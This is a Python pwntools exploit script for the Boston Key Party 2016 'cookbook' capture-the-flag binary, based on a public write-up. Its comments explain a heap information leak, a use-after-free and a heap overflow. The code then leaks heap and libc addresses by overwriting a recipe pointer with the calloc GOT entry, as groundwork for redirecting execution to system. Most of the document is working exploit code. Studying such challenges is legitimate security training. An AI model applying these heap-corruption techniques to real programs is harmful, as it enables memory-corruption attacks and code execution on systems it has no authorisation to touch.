# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#
# Based on the Joshua Wang's write-up (http://blog.rh0gue.com/2016-08-20-bkpctf-2015-cookbook/)
#

from pwn import *
import re
import ctypes


'''
information leakage: 'ptr to the top chunk' can be leaked.

* create recipe

* new recipe -> malloc one large chunk
    CURRENT_RECIPE = calloc(1u, 0x40C)

    [head to ingredient list] [head to howmany list] [recipe name] [type] [info]
    ^                         ^                      ^             ^      ^
    |                         |                      |             |      |
    0                         4                      8            123    140

* add ingredient -> malloc two small chunks
    list_add(CURRENT_RECIPE, find_ingredient(nptr)) ->
        calloc(1u, 8u)
    list_add(CURRENT_RECIPE_HOWMANY, strtoul(ntpr)) ->
        calloc(1u, 8u)

* discard recipe -> the last (large) chunk gets freed and moved to bins. both [head to ingredient list] and [head to howmany list] get overwritten with the pointer which points somewhere in main_arena.binlist

    free(CURRENT_RECIPE)

* print current recipe -> 

         [ptr][ptr][name][type][info]
         [fd ][bk ]
                |
                |
main_arena      V
binlist  [ptr to the top chunk] [NULL]
                                  ^
                                  |
                                  +- Why NULL? I don't know. pretty convenient, though.

    for (i = 0; i < list_length(&CURRENT_RECIPE); i++) { 
        v8 = nth_item(&CURRENT_RECIPE_HOWMANY, i) // [bk] becomes the listhead
        ...
        printf("%zd - %s\n", v8, ...); // [ptr to the top chunk] is getting leaked
    }


heap overflow:

    case 'g':
        if ( CURRENT_RECIPE )
            fgets((char *)CURRENT_RECIPE + 140, 1036, stdin);
        else
            puts("can't do it on a null guy");
        continue
'''


r = process('./cookbook')

b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

CALLOC_GOT = b.got['calloc']
STRTOUL_GOT = b.got['strtoul']
SYSTEM_OFFSET = libc.symbols['system']

s = lambda x: r.send(x + '\n')

def stou(i):
    return ctypes.c_uint32(i).value

if __name__ == '__main__':
    r.recvuntil("what's your name?")
    s('babo')


    # leak address in malloc heap (needed to do house-of-force)

    s('c')
    s('n') # calloc(1, 0x40C)
    s('a') # force to do 2 malloc()'s which will prevent merging with the top chunk.
    s('basil')
    s('1')
    
    s('d') # free(). the first two dword's are overwritten with ptr to main_arena.binlist.

    r.clean()
    s('p') # the first two dword's are treated as listheads.
    resp = r.recv()
    s('q')

    TOP_CHUNK = int(resp.split('\n')[3].split('-')[0])
    log.info('TOP_CHUNK: 0x%x' % TOP_CHUNK)
    HEAP_BASE = TOP_CHUNK - 0x16d8
    log.info('HEAP_BASE: 0x%x' % HEAP_BASE)
    
    r.recvuntil("[q]uit")

    s('g') 
    r.recvuntil(":")
    s('40C') # doing 'calloc(1, 0x40C)' which will overlap with the previous calloc(1, 0x40C)

    # 0x804d048: calloc@got
    RECIPE = TOP_CHUNK - (0x6d8-0x2b0)
    BASIL_NODE = RECIPE + (0x6c0-0x2b0)
    PAYLOAD = p32(BASIL_NODE) + p32(CALLOC_GOT) + "\x00" * (0x40c-4-4)
    s(PAYLOAD) # overwrite [bk]. [fd] should not change.

    s('c')

    r.clean()
    s('p') # use after free
    resp = r.recvuntil("[q]uit")
   
    print resp

    LEAKED = int(resp.split('\n')[3].split(' ')[0])
    LEAKED = stou(LEAKED)
    log.info('LEAKED calloc@plt: 0x%x' % LEAKED)

    LIBC_BASE = LEAKED - libc.symbols['calloc']
    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)

